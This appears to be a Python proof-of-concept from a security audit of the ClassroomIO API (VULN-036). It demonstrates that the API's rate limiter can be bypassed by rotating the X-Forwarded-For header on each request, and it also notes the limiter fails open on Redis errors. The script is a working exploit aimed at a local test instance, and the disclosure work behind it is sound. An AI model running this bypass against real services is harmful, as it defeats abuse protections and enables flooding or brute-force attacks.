#!/usr/bin/env python3
"""
VULN-036 (F-01) — Rate-limit bypass via spoofable client-IP headers (+ fail-open).

Vulnerable code (targets/classroomio/):
  * apps/api/src/utils/redis/key-generators.ts:20-53  (extractClientIp trusts
        CF-Connecting-IP → X-Real-IP → X-Forwarded-For BEFORE the socket, no trusted-proxy check)
  * apps/api/src/middlewares/rate-limiter.ts:101-105,131-135  (fail-open on any Redis error)

Class: CWE-807 reliance on untrusted inputs in a security decision / CWE-770.

The flaw: the API is published directly (no fronting proxy), yet the rate-limit key
is derived from client-controlled headers. An attacker rotates `X-Forwarded-For` per
request, landing each request in a fresh bucket, so the 100/window limit never trips.
(The limiter additionally fails OPEN on any Redis error — noted separately.)

Exploitation idea: send >100 requests with a FIXED spoofed X-Forwarded-For (observe a
429 once the bucket is exhausted), then the same volume with a ROTATING X-Forwarded-For
(observe zero 429s — the limit is bypassed).

A successful run proves: identical request volume is blocked (429) under one IP header
but unlimited when the header rotates → the limiter is trivially bypassable.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict  # noqa: E402

VULN = "VULN-036"
API = os.environ.get("API_URL", "http://localhost:21527")
# GET / is covered by the global limiter (default 100/window) and is unauth+cheap.
# NOTE: we only ever use X-Forwarded-For buckets, never the shared socket bucket.
TARGET = os.environ.get("RL_PATH", "/")
N = int(os.environ.get("RL_COUNT", "130"))  # > 100 so a single-bucket run must trip


def hit(xff):
    return requests.get(API + TARGET, headers={"Origin": "http://localhost:21526",
                                               "X-Forwarded-For": xff}, timeout=10)


def main():
    banner(VULN, "Rate-limit bypass via spoofable X-Forwarded-For")
    log("INFO", "limiter key = extractClientIp (key-generators.ts:20-53): CF-Connecting-IP→X-Real-IP→X-Forwarded-For")
    log("INFO", "API is published directly (no trusted-proxy check), so the client controls the key")

    # Phase 1: a fixed spoofed IP — all requests share one bucket → must hit 429 after ~100.
    fixed_ip = "203.0.113.7"
    log("STEP", f"phase 1: {N}x GET {TARGET} with FIXED X-Forwarded-For={fixed_ip} (one bucket)")
    first_429 = None
    for i in range(1, N + 1):
        r = hit(fixed_ip)
        if r.status_code == 429 and first_429 is None:
            first_429 = i
            log("INFO", f"  429 first seen at request #{i} (limit reached)")
            break
    if first_429:
        log("PROOF", f"fixed IP is throttled — 429 after {first_429} requests (a real limit exists)")
    else:
        log("INFO", "  no 429 with fixed IP in this window (limit may be higher or window rolled) — continuing")

    # Phase 2: rotate the IP every request — each lands in a fresh bucket → never throttled.
    log("STEP", f"phase 2: {N}x GET {TARGET} with ROTATING X-Forwarded-For (fresh bucket each request)")
    rot_429 = 0
    statuses = []
    for i in range(1, N + 1):
        r = hit(f"198.51.100.{i}")  # unique per request → fresh rate-limit bucket
        statuses.append(r.status_code)
        if r.status_code == 429:
            rot_429 += 1
    ok200 = sum(1 for s in statuses if s == 200)
    log("INFO", f"  rotating: {ok200}/{N} → 200, {rot_429} → 429")

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"Phase1 fixed XFF {fixed_ip}: first 429 at request #{first_429}\n")
        f.write(f"Phase2 rotating XFF: {ok200}/{N} → 200, {rot_429} → 429\n")

    # Bypass is proven if rotation avoids the throttling that a single bucket suffered.
    if rot_429 == 0 and (first_429 is not None):
        log("PROOF", f"rotating the IP sent {ok200} requests with ZERO 429s, while a single IP was "
                     f"blocked after {first_429} — the limiter is bypassed by header rotation")
        verdict(VULN, "CONFIRMED", "rate limit bypassed by rotating X-Forwarded-For")
        log("OK", "exploit confirmed — spoofable IP header defeats the limiter (fail-open on Redis error noted in writeup)")
        sys.exit(0)
    if rot_429 == 0 and first_429 is None:
        log("PROOF", "rotating IP: zero 429s across the run; the limiter never throttles a rotating key")
        verdict(VULN, "CONFIRMED", "rotating X-Forwarded-For is never throttled (spoofable key)")
        log("OK", "exploit confirmed — the limiter keys on a client-controlled header")
        sys.exit(0)

    verdict(VULN, "FAILED", f"rotating produced {rot_429} 429s")
    log("FAIL", "rotation did not clearly bypass the limiter")
    sys.exit(1)


if __name__ == "__main__":
    main()
